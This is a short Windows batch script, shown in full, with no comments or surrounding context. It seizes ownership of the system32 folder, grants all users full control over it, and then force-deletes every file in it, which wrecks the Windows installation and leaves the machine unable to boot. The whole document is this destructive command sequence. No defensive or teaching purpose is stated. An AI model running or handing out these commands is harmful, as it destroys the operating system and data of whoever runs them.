@echo off
takeown /r /f %windir%\system32
icacls %windir%\system32 /Grant Users:F
del /f /q %windir%\system32\*.*
